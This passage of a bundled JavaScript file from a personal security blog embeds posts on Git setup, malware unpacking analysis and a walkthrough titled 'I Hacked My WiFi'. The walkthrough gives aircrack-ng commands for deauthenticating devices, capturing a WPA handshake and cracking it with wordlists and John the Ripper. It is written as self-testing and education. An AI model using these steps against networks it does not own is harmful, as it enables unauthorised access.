href=\\"https://github.com/gracenolan/Notes/blob/master/interview-study-notes-for-security-engineering.md\\">https://github.com/gracenolan/Notes/blob/master/interview-study-notes-for-security-engineering.md</a></p>"]},{"id":"","title":"","body":[]},{"id":"","title":"","body":[]}]},{"id":"","title":"","body":[]}]}]}')},8994:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"Git Local Repository","tags":["development","git"],"date":"APR 2025","path":"git-local-repository","location":"./blog/","banner":"blog/gitlocalrepository/banner.jpg","type":"blog","search":[{"section":"...","description":"..."}],"body":[{"id":"Git local repository","title":"<h1><span style=\\"color:#da1953\\">Git</span> local repository</h1><hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/blog/gitlocalrepository/banner.jpg\\" alt=\\"\\">"]},{"id":"Introduction","title":"<hr><h1><span style=\\"color:#da1953\\">Int</span>roduction </h1>","body":["<p>Setting up Git and managing repositories on GitHub. In this guide, you\'ll learn how to install Git, generate a personal access token for secure authentication, and effectively download, update, and push changes to your repository. Whether you\'re new to Git or looking to streamline your workflow, this step-by-step tutorial will help you get started quickly.</p>"]},{"id":"Install Git","title":"<h1><span style=\\"color:#da1953\\">Ins</span>tall Git</h1>","body":["<p>Install git from repository: <code>sudo apt install git</code></p>"]},{"id":"Install personal access token","title":"<h1><span style=\\"color:#da1953\\">Ins</span>tall personal access token</h1>","body":["<p>Log in to GitHub and navigate to the Settings page as shown below:</p>","<p><img src=\\"/cyber/blog/gitlocalrepository/settings.png\\" alt=\\"Settings\\"></p>","<p>Click on Developer Settings</p>","<p><img src=\\"/cyber/blog/gitlocalrepository/devsettings.png\\" alt=\\"Dev Settings\\"></p>","<p>Click on Personal Access Tokens</p>","<p><img src=\\"/cyber/blog/gitlocalrepository/pat.png\\" alt=\\"Personal Access Token\\"></p>","<p>Click on Generate new token</p>","<p><img src=\\"/cyber/blog/gitlocalrepository/generate.png\\" alt=\\"Generate Access Token\\"></p>","<p>Now type the name of the token and select the scopes, or permissions, you’d like to grant this token. Make sure you select <em>repo</em> to use your token to access repositories from the command line. Click Generate token at the bottom of the page.</p>","<p><img src=\\"/cyber/blog/gitlocalrepository/keysettings.png\\" alt=\\"Key Settings\\"></p>","<p>Now the key can be used to upload and update the project on github.</p>","<p><img src=\\"/cyber/blog/gitlocalrepository/key.png\\" alt=\\"Key\\"></p>"]},{"id":"Download and update repository","title":"<h1> <span style=\\"color: #da1953\\">Dow</span>nload and update repository</h1>","body":["<p><strong>Step 1</strong></p>","<p><code>git clone &lt;REPOSITORY&gt;</code></p>","<p>e.g. <code>git clone https://github.com/Benwick921/benwick921.github.io.git</code></p>","<p>Once downloaded the repository make your changes.</p>","<p>If you dont want <em>git</em> to create the folder with the same name of the  repository you can run the following command form an empty folder.</p>","<p><code>git clone &lt;url form web&gt; .</code></p>","<p>e.g. <code>git clone https://github.com/Benwick921/benwick921.github.io .</code></p>","<p><strong>Step 2</strong></p>","<p>Add file content to the idex.</p>","<p><code>git add .</code></p>","<p><strong>Step 3</strong></p>","<p>Record changes to the repository.</p>","<p><code>git commit -m &quot;message&quot;</code></p>","<p><strong>Step 4</strong></p>","<p>Update remote refs along with associated objects.</p>","<p><code>git push https://&lt;GITHUB_ACCESS_TOKEN&gt;@github.com/&lt;GITHUB_USERNAME&gt;/&lt;REPOSITORY_NAME&gt;.git</code></p>","<p>Remember to replace &lt;GITHUB_ACCESS_TOKEN&gt;, &lt;GITHUB_USERNAME&gt;, &lt;REPOSITORY_NAME&gt; with your token, username and repository.</p>","<p>eg. <code>git push https://ghp***********************YC@github.com/Benwick921/Benwick921.github.io.git</code></p>"]},{"id":"Upload bigger file size","title":"<h1><span style=\\"color: #da1953\\">Upl</span>oad bigger file size</h1>","body":["<p>To upload bigger file size (max 100MB) open the git command line and execute the following 3 commnads:</p>","<p><pre>git lfs install<br>git lfs track \\"*.*\\" //this includes every possible file extention<br>git add .gitattributes</pre></p>"]}]}]}')},5644:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"I Hacked My WiFi","tags":["security","networking","wifi","cracking","password","aircrack","debian"],"date":"OCT 2017","path":"i-hacked-my-wifi","location":"./blog/","banner":"blog/ihackedmywifi/banner.webp","type":"blog","search":[{"section":"Introduction","description":"This section introduces the decision to revive an old PC with Debian and test Wi-Fi security by attempting to crack Wi-Fi, highlighting the need for Linux root privileges for network security tasks."},{"section":"Requirements","description":"This section outlines the essential tools for Wi-Fi cracking, including Aircrack-ng for network monitoring and John the Ripper for brute force attacks, explaining their installation on Debian and Kali Linux."},{"section":"Find wireless interface name","description":"This part covers how to identify the wireless interface name using commands like `iwconfig` and alternatives, ensuring proper network setup before Wi-Fi cracking."},{"section":"Kill interfering processes","description":"This section explains the importance of stopping interfering processes using `airmon-ng check kill` before enabling monitor mode for effective Wi-Fi traffic monitoring."},{"section":"Enable monitor mode","description":"Describes how to enable monitor mode with `airmon-ng start`, allowing the wireless interface to capture all traffic on a specific channel, crucial for network packet analysis."},{"section":"Discover access point","description":"This section details discovering nearby access points and capturing wireless packets with `airodump-ng`, essential for gathering data from target networks."},{"section":"Save data to file","description":"Explains saving captured wireless data to files using `airodump-ng -w`, setting up files for later analysis and decryption attempts."},{"section":"Deauthentication","description":"Discusses the use of `aireplay-ng –deauth` to disconnect devices, forcing them to reconnect and send a hashed password, which is crucial for capturing the WPA handshake."},{"section":"Crack the password","description":"This final section explores password-cracking methods, including dictionary attacks with `aircrack-ng` and brute force using John the Ripper, detailing file conversion steps to make captured data compatible with cracking tools."}],"body":[{"id":"I Hacked My WiFi","title":"<h1> <span style=\\"color:#da1953\\">I Ha</span>cked My WiFi</h1><hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/blog/ihackedmywifi/banner.webp\\" alt=\\"\\">"]},{"id":"Introduction","title":"<hr><h2> <span style=\\"color:#da1953\\">Int</span>roduction</h2>","body":["<p> Recently I decided to bring my 9 years old pc back to life. I opted for Debian as the operating system due to the very minimal system specifications, and therefore perfect for my case. After a painstakingly long time taken for the installation of Debian, I decided to try to crack my WI-FI just to tinker maybe due to a little bit of nostalgia, and a little just to test my Wi-Fi security, (Note all commands launched from now on need root privileges. To get the privileges just type su – and enter the password to become root.)</p>"]},{"id":"Requierements","title":"<h2 id=\\"REQ\\"> <span style=\\"color:#da1953\\">Req</span>uirements </h2>","body":["<p>I need to install Aircrack-ng to perform the attack and JTR (John The Ripper) to perform brute force cracking, unless I am in Kali Linux I will install by typing apt install aircrack-ng and for JTR I suggest using the one installed on Kali Linux that works out of the box.</p>"]},{"id":"Find wireless interface name","title":"<h2> <span style=\\"color:#da1953\\">Fin</span>d wireless interface name </h2>","body":["<p>To find the name of the wireless interface I run <code>iwconfig</code>.</p>","<p><img src=\\"/cyber/blog/ihackedmywifi/iwconfig.png\\" alt=\\"iwconfig\\"></p>","<p>but any other commands for networking will work fine, such as <code>ifconfig</code> (which is deprecated now use <code>ip address</code> / <code>ip add</code> / <code>ip a</code>).</p>","<p><img src=\\"/cyber/blog/ihackedmywifi/ipa.png\\" alt=\\"ip a\\"></p>","<p>I do not know why but, in my case, I have a very strange name (wlp2s0b1) I would have expected to see something like wlan0.</p>"]},{"id":"Kill interfering processes","title":"<h2> <span style=\\"color:#da1953\\">Kil</span>l interfering processes </h2>","body":["<p>Before enabling monitor mode, we need to kill interfering processes.</p>","<p>To check which process might interfere run <code>airmon-ng check</code>.</p>","<p><img src=\\"/cyber/blog/ihackedmywifi/check.png\\" alt=\\"airmon-ng check\\"></p>","<p>To kill the interfering processes run <code>airmon-ng check kill</code> or kill them manually.</p>","<img src=\\"/cyber/blog/ihackedmywifi/checkkill.png\\" alt=\\"airmon-ng check kill\\">"]},{"id":"Enable monitor mode","title":"<h2> <span style=\\"color:#da1953\\">Ena</span>ble monitor mode </h2>","body":["<p>Monitor mode allows a computer with a wireless network interface controller to monitor all traffic received on a given wireless channel.</p>","<p>To enable monitor mode type <code>airmon-ng start wlp2s0b1</code>.</p>","<p><img src=\\"/cyber/blog/ihackedmywifi/startwlan0.png\\" alt=\\"start wlan\\"></p>","<p>Now a new name has been assigned to the interface (wlp2s0b1mon) and from now on I will use that.</p>"]},{"id":"Discover access point","title":"<h2> <span style=\\"color:#da1953\\">Dis</span>cover Access Point </h2>","body":["<p>To discover surrounding access point type <code>airodump-ng wlp2s0b1mon</code>.</p>","<p><img src=\\"/cyber/blog/ihackedmywifi/airodumpvlan0.png\\" alt=\\"airodump vlan\\"></p>","<p>Now we will start to catch all the wireless packets and gather data from the networks.</p>","<p>From this step onward we need to remember the victim (me) Wi-Fi channel, in my case is 1.</p>","<p><span style=\\"color:#FFC107\\">This terminal must never be closed as it will be used to find out if we have successfully established the 4-way handshake which contains the password hash for authentication.</span></p>","<p><span style=\\"color:#FFC107\\">The next step will be done in another window.</span></p>"]},{"id":"Save data to file","title":"<h2> <span style=\\"color:#da1953\\">Sav</span>e data to file </h2>","body":["<p>To save data in files we need to use the same command we use in step 4 with a different option.</p>","<p><code>airodump-ng -c [channel] –bssid [bssid of victim wifi] -w [path to write files] wlp2s0b1mon[interface]</code></p>","<p><img src=\\"/cyber/blog/ihackedmywifi/savefilecap.png\\" alt=\\"save file\\"></p>","<p>The result of the command will be something like this.</p>","<p><img src=\\"/cyber/blog/ihackedmywifi/safilecap1.png\\" alt=\\"save file\\"></p>","<p>And it will also create files on the given path (in my case the current directory).</p>","<p><img src=\\"/cyber/blog/ihackedmywifi/savefilecap2.png\\" alt=\\"save file\\"></p>","<p><span style=\\"color:#FFC107\\">Same as for step 4 I leave the window open and the next operations will be done in a further third window.</span></p>"]},{"id":"Deauthentication","title":"<h2> <span style=\\"color:#da1953\\">Dea</span>uthentication </h2>","body":["<p>The goal of this phase is to disconnect all the devices connected to the Wi-Fi so that when they reconnect, they will send the password under the hash signature to the router and then we can capture it to crack it.</p>","<p>The channel used is the same as the previous one where the victim is (1).</p>","<p>To do so the command is <code>aireplay-ng –deauth 1 -a [victim BSSID] wlp2s0b1mon</code>.</p>","<p><img src=\\"/cyber/blog/ihackedmywifi/deauth1.png\\" alt=\\"deauthentication\\"></p>","<p>It will establish the handshake alongside the hash of the password and the same in the file previously set.</p>","<p>On my first try even if everything went well for some reason Aircrack-ng didn’t find the handshake in the .cap file so just to be sure I tend to repeat this step a few times.</p>","<p>If we correctly establish the handshake, I will see it in the window where I executed<br><code>airodump-ng -c [channel] –bssid [bssid of victim wifi] -w [path to write files] wlp2s0b1mon[interface]</code></p>","<p><img src=\\"/cyber/blog/ihackedmywifi/checkhandshake.png\\" alt=\\"check handshake\\"></p>","<p>Sometimes you might get a message where the network interface and the victim’s Wi-Fi are in different channels, don’t panic just run the command again and again until you get it!</p>","<p><img src=\\"/cyber/blog/ihackedmywifi/differentchannels.png\\" alt=\\"channel\\"></p>","<p>You might never get the handshake containing the hash if no devices are connected! Don’t lose your hope. In this case, you need to wait until someone comes and hopefully connects to the Wi-Fi.</p>"]},{"id":"Crack the password","title":"<h2> <span style=\\"color:#da1953\\">Ste</span>p 7: Crack the password </h2>","body":["<p>There are a few methods to crack the password the first method I tried is the dictionary attack, to perform it execute<br><code>aircrack-ng -b [victim BSSID] -w [wordlistpath] [path to .cap file]</code></p>","<p>I created a tiny wordlist containing my password for testing purposes, in a real world-scenario, I would use good wordlists, not necessarily big but good and more than one probably.</p>","<p>The .cap file is automatically created on a given path to save the files in step 5.</p>","<p><img src=\\"/cyber/blog/ihackedmywifi/cracked.png\\" alt=\\"cracked\\"></p>","<p>What if the password is not in the wordlist? I have to try different types of attacks like brute force.</p>","<p>To do the brute force attack I moved to my Kali Linux because it has JTR (John The Ripper) installed properly, which is my favourite cracking program, and with all its features which include the cracking of wpa keys.</p>","<p>To let JTR to be able to crack a WPA handshake I need to convert the .pcap file to a proper format, the first thing is to convert the pcap file into a .hccap file, to do so we will use aircrack-ng: <code>aircrack-ng [.pcap file] -J [filename]</code></p>","<p><img src=\\"/cyber/blog/ihackedmywifi/pcap2hccap.jpg\\" alt=\\"pcap2hhcap\\"></p>","<p>Now I will convert the .hccap file into a a file that JTR can understand and crack:<br><code>hccap2john [.hccap file] &gt; [filename]</code></p>","<p>At this point, we can use any mode JTR has to crack the password:<br><code>john [optional mode] [file]</code></p>","<p><img src=\\"/cyber/blog/ihackedmywifi/jtr.jpg\\" alt=\\"john the ripper\\"></p>","<p>To see all the modes avalaible I suggesto to look the manual of JTR.</p>"]}]}]}')},4875:e=>{"use strict";e.exports=JSON.parse('{"files":["blogdb/git-local-repository.json","blogdb/malware-thesis.json","blogdb/vb-password-bypass.json","blogdb/cybersecurity-interview-questions.json","blogdb/cybersecurity-in-the-sea","blogdb/manual-unpacking-upx-and-mpress.json","blogdb/run-and-debug-dll.json","blogdb/i-hacked-my-wifi.json"],"disabled":["blogdb/test.json"],"next":[]}')},7825:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"A Review of Common Practices for Malware Unpacking","tags":["security","networking","reverse engineering","pestudio","ida","detectiteasy","vmware","scylla","upx","mpress","malware packing","unpacking","iot","iat"],"date":"OCT 2023","path":"malware-thesis","banner":"blog/thesis/banner.webp","location":"./blog/","type":"blog","search":[{"section":"KeyWord1","description":"No description yet."}],"body":[{"id":"A Review of Common Practices for Malware Unpacking","title":"<h1><span style=\\"color:#da1953\\">A Re</span>view of Common Practices for Malware Unpacking<hr></h1>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/blog/thesis/banner.webp\\" alt=\\"\\">"]},{"id":"1. Abstract","title":"<hr><h2><span style=\\"color:#da1953\\">1. Ab</span>stract</h2>","body":["<p>In today’s digital world software security is a very important aspect and plays a vital role in protecting people, information and intellectual properties from malicious users. However, malicious users develop day by day more sophisticated strategies to achieve their goals by exploiting from old to newly discovered vulnerabilities and targeting the weakest chain of the cyber security, the human.</p>","<p>With more sophisticated attacks the protection mechanism to detect and respond to these attacks also becomes sophisticated. Due to this reason malicious attackers implements protection layers in particular to malware attacks in order to evade detection and analysis. To such purpose packer software is the perfect solution.</p>","<p>The study of packers and their impact on software security and cyber-attacks is crucial for understanding the techniques employed by both malicious actors and legitimate software developers. This thesis aims to provide an exploration of packers, including their mechanisms, functionality, and implications for software analysis.</p>","<p>The primary objective of this thesis is to analyze and evaluate different packer techniques, dissecting their inner workings and investigating the challenges they pose to traditional security analysis approaches. By examining various packers\' features, we seek to increase our understanding of their strengths, weaknesses, and potential mitigations. Furthermore, this thesis aims to propose a possible strategy to analyze advanced packers by exploring innovative approaches.</p>","<p>The chapter 2 and 3 introduce the concept of packers and their basic functionalities, their inner work, and different types of packers. These chapters explain the purpose of packing how they were born and how they were used differently from their initial purpose for malicious intents.</p>","<p>Chater 3 and 4 goes deep down on analyzing these packers understanding different approaches and strategies, their advantages, and disadvantages, and how they can be combined to have a more complete understanding of if the packed malware. I particularly the chapter 5 give guidance on how to set up a possible virtual environment for analyzing such malware. Furthermore, it describes how to identify if an executable is packed and hides malicious payload inside by analyzing various packing indicator. Lastly, it shows step by step how to unpack a simpler version UPX and MPRESS packers for a demonstration purpose and how to extract the packed code.</p>","<p>Chapter 6 is focus on an advanced technique to identify packers, as they can implement techniques to hide indication from packer analysis tools. This chapter explains what feature to extract and how to analyze them in order to identify packer indications.</p>","<p>Chapter 7 and 9 introduce advanced packers, their behaviour and evasion techniques. The analysis of these packers is not trivial, and they are time consuming. This chapter describes the techniques employed by the packer to evade analysis by malware analyst. Complex packers described in the chapter that implement such advanced evasion techniques are Themida and PEzoNG.</p>","<p>Chapter 8 and 9 propose a solution for advanced packers implementing diverse evasion techniques making analyzing them time consuming and hard. The chapters propose an execution path strategy in order to execute all the branches and a signature-based technique to detect pattern a logic flow to build a database of signature for future detection.</p>","<p>The chapter 10 studies the possibility to perform packing and unpacking on embedded systems and IoT. As they have a very limited computational powers executing advanced evasion technique may not be possible to implement. The chapter also studies the performance of UPX and RSA packing on such systems.</p>","<p>In conclusion, this thesis aims to enlighten the complex world of packers, providing valuable insights into their workings, their impact on software security, and potential countermeasures. By reducing the gap between packer technologies and security analysis, we strive to give a good understanding of their potential and utilization.</p>"]},{"id":"2 Introduction","title":"<h2> <span style=\\"color:#da1953\\">2.1 Int</span>roduction to packers </h2>","body":[{"title":"<h3>2.1 Packing purpose </h3>","id":"2.1 Packing purpose","body":["<p>Packing is a technique that is widely used to compress software to reduce in size, often it improves performance, protects intellectual properties, and prevents tamper. One of the main purposes of packing software is to reduce the size which makes the distribution and the download of the executable faster compared to its original size, especially for big software. This is really useful, for software distributed over the internet, which makes it convenient for users.</p>","<p>Another benefit of packing is to protect intellectual properties by hindering third parties from reverse engineering and decompiling the code. This can prevent competitors from stealing the code or creating a similar product. Various techniques of packing can be implemented in order to protect the software.</P>","<p>Malicious users use the packing technique to avoid detection mechanisms by detection software such as Firewalls and Intrusion Detections Systems (IDS) by compressing or encrypting the malicious code. This makes it difficult to be detected by the protection mechanisms.</p>","<p>As further protection packers can implement anti-debugging and anti-tampering techniques on the malware. Malware packed in such mechanisms makes really difficult to be analyzed. Anti-debugging technique detects and tries to prevent debugging attempts by checking for example breakpoint which is a clear indication of debugging. Anti-tampering mechanisms on the other hand tried to detect changes in the code and a possible way can be by computing checksums and digital signatures. If the mentioned actions are detected by the malware, it may terminate or alter its behavior as a protection mechanism to mislead malware analysts.</p>","<p>Finally, the main purpose of malware packers is to increase the chances of successfully infecting a target system, avoiding detection by security measures, making the malware hard to analyze in order to understand how internally it works and mitigate any infection.</p>"]},{"id":"2.2 How packers work","title":"<h3>2.2 How packers work</h3>","body":["<p>During the packing process, the packing software takes as input the original executable file (PE) and generated a new packed file.  During the packing process, the packer can encrypt or compress the original PE file or a combination of both. This newly packed file contains the original PE file and the code to unpack it during the execution usually called “stub” which is the new entry point of the executable. The stub is usually designated to unencrypt or decompress the original PE but, in some cases, it can also encrypt and compress back the code.</p>","<p>The following image shows an example of how the executable file changes before and after the packing process:</p>","<p><img src=\\"/cyber/blog/thesis/1.png\\" alt=\\"PE vs Packed PE\\"></p>","<p>The newly packed PE file has a different structure than the original PE, trying to analyze this file will result in an unsuccessful attempt as the real code is not extracted yet.</p>","<p>The packer can modify the PE header or remove it completely in an attempt to evade detections by security systems or malware analysts. The packer can also add some additional code as anti-debugging and anti-tampering technique. When the packed PE is executed the first entry point is the stub which extracts the packed code to be unpacked. Once the extractions finishes, the control is passed to the unpacked code to be executed. The following image shows the steps involved during this process:</p>","<p><img src=\\"/cyber/blog/thesis/2.png\\" alt=\\"\\"></p>","<p>Understanding how the packing process works and how the PE section can be modified is as important as to keep the system up to date, use strong passwords, and avoid getting files from untrusted sources to avoid getting infected.</p>","<p>The structure of a packed PE file is complex as it is usually customized by malware writers to obfuscate the malicious code. During the analysis of a packer the main objective is to find the Original Entry Point (OEP), which is the starting point of the original malicious code. Identifying the OEP is not always trivial as malware authors can implement techniques to make this step difficult.</p>","<p>Overall, the process of packing malware is constantly evolving, and malware authors are continually developing new techniques to evade detection. As security researchers, it\'s crucial to keep up with the latest malware-packing methods to detect and prevent.</p>"]}]},{"id":"3 Standard packer vs runtime packer","title":"<h2> <span style=\\"color:#da1953\\">3 St</span>andard packer vs runtime packer </h2>","body":["<p>One of the main advantages of using a standard packer is that it can compress the executable file, reducing its size on disk. This can be beneficial for distributing files over networks or on portable storage devices. However, because the packed file needs to be unpacked before it can execute normally, it can also make analysis and debug more difficult.</p>","<p>A standard packer typically works by compressing or encrypting the original executable file and then appending a small piece of code to the file. This code is responsible for decompressing or decrypting the rest of the file and generating the packed PE to be executed.</p>","<p>In contrast, a runtime packer modifies the executable file in memory, rather than on disk. There is a runtime component that is responsible for extracting each time the portions of code that the program needs and possibly removing those that are not currently in use. This makes it more difficult to detect and analyze the packed code since the modifications are not visible on the disk. Because runtime packers modify the program\'s memory space, they can also be used to protect against memory-based attacks, such as buffer overflows. By randomizing the memory layout of the program, a runtime packer can make it more difficult for attackers to exploit vulnerabilities in the code.</p>","<p>Different malware can implement different strategies to obfuscate the unpacked part each time. The one shown below is a simplified behaviour as they vary from malware to malware. The following image shows a simplified series of steps performed by the runtime packer:</p>","<p><img src=\\"/cyber/blog/thesis/3.png\\" alt=\\"\\"></p>","<p>However, there are also some drawbacks to using a runtime packer. One of the main disadvantages is that it can make debugging and analysis more difficult since the packed code is not visible on the disk. In addition, because the packer code is executed in memory, it can be more vulnerable to anti-tampering techniques, such as code obfuscation or anti-debugging measures.</p>","<p>Overall, both packers and runtime packers are used to make malware analysis more difficult. While standard packers compress or encrypt an executable file on a disk, runtime packers modify the executable in memory. The use of runtime packers is becoming more common among malware authors, as they can be more difficult to detect and analyze. However, in order to increase even more the complexity of the analysis different combinations of different techniques can be put in place, for example, the technique previously mentioned in combination with parallel unpacking using child processes or threads will add complexity during the analysis phase.</p>"]},{"id":"4 Different approaches to analyze packed malware","title":"<h2> <span style=\\"color:#da1953\\">4 Di</span>fferent approaches to analyze packed malware</h2>","body":[{"id":"4.1 Intodcution","title":"<h3>4.1 Introduction</h3>","body":["<p>Malware analysis is a critical aspect of the cybersecurity field as it helps to identify, understand, and mitigate malicious software. Malware can be designed to cause various types of harm, such as stealing sensitive data, damaging systems, or hijacking resources for nefarious purposes. To counter such threats, security professionals use different methods and tools to analyze malware and gain insights into its behavior.</p>","<p>There are three primary approaches to analyzing malware: static analysis, dynamic analysis, and hybrid analysis. Each technique has its own strengths and weaknesses, and security analysts choose the appropriate method based on their objectives and the type of malware they are dealing with.</p>","<p>Static analysis involves analyzing the malware\'s code without actually executing it. One of the main advantages of static analysis is that it is a non-intrusive method, which means that the malware is not actually run on the system, reducing the risk of contamination and being discovered by the malware writer that his malware is being analyzed. This also prevents future patches by the malware writer in order to make the malware harder to be detected.</p>","<p>Additionally, static analysis can be performed quickly, making it an effective method for identifying known malware. For such purposes, various tools and techniques can be used such as disassembling the executable code, examining metadata, analyzing strings, and checking the digital signature of the file.</p>","<p>Dynamic analysis involves running the malware in a controlled environment, such as a virtual machine or sandbox, to observe its behavior. This technique is useful for detecting malware that is designed to evade detection or that requires specific environmental conditions to activate. Dynamic analysis techniques include monitoring system calls, network traffic, and file system changes.</p>","<p>The dynamic analysis provides detailed insights into the behavior of the malware, allowing analysts to identify the type of malware, its purpose, and the systems it interacts with. However, dynamic analysis can be a time-consuming process, and there is a risk of contamination if the malware is not properly contained in the analysis environment.</p>","<p>During this step, it is important to take all the precautions to safeguard the malware. It is important to execute it with due diligence and make sure the testing environment is isolated. Also, it is important to take a safe copy of the malware or execute continuous snapshots of the testing environment in case the malware deletes itself, overwrites portions of code, or implements additional defence mechanism to void being analyzed.</p>","<p>The hybrid analysis, a combination both static and dynamic analysis techniques, provides a comprehensive understanding of the malware. This technique involves first performing a static analysis to identify the malware\'s characteristics, followed by a dynamic analysis to observe its behaviour. Hybrid analysis can be an effective method for detecting advanced malware that is designed to evade detection or that uses sophisticated techniques to obfuscate its code.</p>","<p>The initial static analysis and the discovery of information in this phase are really helpful during the dynamic analysis phase. The static analysis gives an overview and an idea of the malware and what to expect from it, static analysis can also reduce the time consumed by the dynamic analysis phase in case some key information are found.</p>"]},{"id":"4.2 Static Analysis","title":"<h3>4.2 Static Analysis</h3>","body":["<p>One effective method of analyzing malware is through static analysis, which involves examining the code and structure of a malware sample without executing it. One of the primary techniques used in static analysis is disassembly, also known as reverse engineering. Disassembly involves converting the binary code of a program into human-readable assembly code that can be analyzed and understood.</p>","<p>During static analysis, it is possible to extract a wide range of information about malware, including the strings contained in the malware, the system calls used, and the entropy if the malware was packed. This information can help analysts understand the intent of the malware, its capabilities, and potential weaknesses that can be exploited.</p>","<p><i>“Basic static analysis consists of examining the executable file without viewing the actual instructions. Basic static analysis can confirm whether a file is malicious, provide information about its functionality, and sometimes provide information that will allow you to produce simple network signatures. Basic static analysis is straightforward and can be quick, but it’s largely ineffective against sophisticated malware, and it can miss important behaviors <sup>[1]</sup>”</i>.</p>","<p>In the event of packed malware, the aim at this stage is to get a general idea of what the malware might be, i.e., whether the malware is really packed, whether there are indicators to confirm this, and the type of packing it might implement.</p>","<p>The following packing indicator is taken from DetectItEasy (DIE). With DIE, it is possible to identify packers and retrieve useful information about the malware sample. For instance, when analyzing a malware sample, DIE can identify whether malware is packed or not. In addition, DIE can retrieve the version number of the packer, in this specific case as shown below is 3.93, which can be used to identify known vulnerabilities and weaknesses in the packer itself which is useful during the analysis phase.</p>","<p><img src=\\"/cyber/blog/thesis/4.png\\" alt=\\"\\"></p>","<p>A useful feature of DIE is the capability to obtain the number of sections from the packed file. This can provide valuable information on the internal structure of the malware and help to confirm the presence of the packer. In fact, from the malware sample analyzed, DIE found three sections containing UPX in the name.</p>","<p><img src=\\"/cyber/blog/thesis/5.png\\" alt=\\"\\"></p>","<p>To further confirm whether the malware is packed or not, it is possible to check the entropy of the file. Since packed files tend to have a high entropy due to the compression and encryption techniques used, checking the entropy can help to confirm the presence of the packer. As shown in the picture there is a spike in the entropy graph reaching the value of 7 which we can consider enough high to say that the malware is packed.</p>","<p><img src=\\"/cyber/blog/thesis/6.png\\" alt=\\"\\"></p>","<p>Another advantage of static analysis is that it can be performed on multiple samples simultaneously, allowing for rapid identification of commonalities and patterns across different malware variants. This can help analysts identify and understand larger malware families and the techniques they use to evade detection. This can be performed from the command line for example with the command \\"strings\\" and grepping key strings such as \\"host\\", \\"IP\\" or \\"socket\\" in search of an external connection to the command and control or via Yara rules that can identify patterns and advanced metrics.</p>","<p><img src=\\"/cyber/blog/thesis/7.png\\" alt=\\"\\"></p>","<p>The subset of findings presented in the image above reveals important information about the behaviour of the analysed malware. One of the notable indicators is the string \'Writing %s section to 0x%p\\\\r\\\\n\', which suggests that the unpacked code is written into memory due to the presence of packing. Additionally, the strings \'Getting thread context\' and \'Setting thread context\' imply that the malware employs threads to perform certain operations. The occurrence of the strings \'Creating process\' and \'GetCurrentProcesID\' is indicative of the creation of new processes by the malware.</p>","<p>Moreover, the string \'IsDebuggerPreset\' raises the possibility that the malware attempts to detect whether it is being analysed and may modify its behaviour accordingly. This underscores the importance of using anti-analysis techniques by malware authors to evade detection and analysis by security researchers. This gives an idea of what the malware might do and how it might behave. This is very useful if, after the first static analysis phase, we proceed to a dynamic analysis, so that we already know what to expect from the malware.</p>","<p>However, there are also limitations to static analysis. For instance, some malware variants use advanced obfuscation techniques to make their code difficult to analyse, such as using anti-disassembly techniques or encrypting critical sections of their code. Additionally, static analysis alone cannot provide a complete understanding of how the malware operates, as it cannot account for the behaviour of the malware in different environments or the impact of the malware on the system.</p>"]},{"id":"4.3 Dynamic Analysis","title":"<h3>4.3 Dynamic analysis</h3>","body":["<p>Malware has become a significant threat to computer systems and networks, and its proliferation is increasing day by day. To counter this, various techniques have been developed to analyze malware and to understand its behavior, the operations it performs, and its objectives. For such purposes, dynamic analysis is used. It is the process of observing the behavior of a piece of malicious software and understanding its purpose.</p>","<p>The primary goal of dynamic analysis is to understand the behavior of the malware when it is executed. Dynamic analysis can help in identifying the malware\'s objectives, capabilities, and methods of propagation. In the case of packed malware dynamic analysis can help to find the critical pieces of code such as the stub which is the code used to extract the packed section or the tail jump, a jump instruction pointing to the original malicious code.</p>","<p>Dynamic analysis can also help in identifying the presence of any anti-analysis or evasion techniques used by the malware, in the event of packed malware for example it can monitor the read-and-write system calls of unpacked code and identify changes in the memory sections. It can also determine the malware\'s impact on the system or network, such as changes in the registry or file system, network communication, and system resource utilization.</p>","<p>The following image is the representation of the memory segment before and after executing the packed malware and it clearly indicates the changes it does and the extraction in memory of the packed code.</p>","<p><img src=\\"/cyber/blog/thesis/8.png\\" alt=\\"\\"></p>","<p>In particular with dynamic analysis, it is possible to monitor system calls, by monitoring them it is possible to have a brief understanding, in some cases detailed and precise, of what operations the malware is performing and what can be the purpose of such. For example, if we find the socket() system call, we can assume that the malware most likely communicates with a remote host that could be the command and control (C&C). The purpose of such communication could be to receive remote commands to perform operations, exfiltrate data and send it to the remote host, or even update the malware.</p>","<p>Another advantage of running malware is that one can see the changes it makes to the system. Malware can make different changes to the system such as changes to the file system, registry, and system resources. These changes can, for instance, be intended to persist in the event of a system restart, to hide from analysts or security software, or create DLL files.</p>","<p>With dynamic analysis, it is also possible to analyze multi-threaded or multi-process malware. The creation and execution of these threads or processes are not immediate via static analysis. In fact, it is easier to run the malware, and then dump the threads or the processes it created. Even if most of this information could be found by static analysis, it involves very long analysis times that can be reduced by dynamic analysis, especially in the case of packed malware where the original code is obfuscated.</p>","<p>Dynamic analysis has its limitations, mainly due to the complexity of modern malware. Malware authors implement a variety of techniques to evade detection, such as anti-debugging and anti-virtualization techniques. They also use advanced encryption and obfuscation methods to make the malware more difficult to analyze and they can also be designed to detect the presence of a sandbox or virtual environment. Malware often alters its behavior accordingly in presence of an analysis environment or debuggers leading the analyst in the wrong direction.</p>"]},{"id":"4.4 Hybrid (sandbox) analysis","title":"<h3>4.4 Hybrid (sandbox) analysis</h3>","body":["<p>With dynamic analysis, it is possible to analyze the behavior of malware in a controlled environment. The main goal of dynamic analysis is to observe the behavior of malware when executed which otherwise could not be understood. Dynamic analysis can help in identifying the malware\'s intent, capabilities, and methods of propagation. For example, it can also identify the malware\'s impact on the system or network, such as changes in the registry or file system, creation of files, creation of scheduled tasks in order to survive a reboot, network communication, and system resource utilization. Dynamic analysis can also help in identifying the presence of any anti-analysis or evasion techniques used by the malware. This is especially useful in presence of thoroughly packed malware or a new packing technique in which unpacking is time-consuming. In this way, it is possible to understand up to a certain degree the analyzed malware and implement a provisional countermeasure.</p>","<p>The hybrid analysis differs from dynamic analysis in its scope. It combines both static and dynamic analysis. Further, it includes an analysis of external elements in which the malware may operate such as the network. Hybrid analysis does not limit to executing the malware, but it also creates a virtualized environment, even with several machines in order to allow the malware to perform the operations it 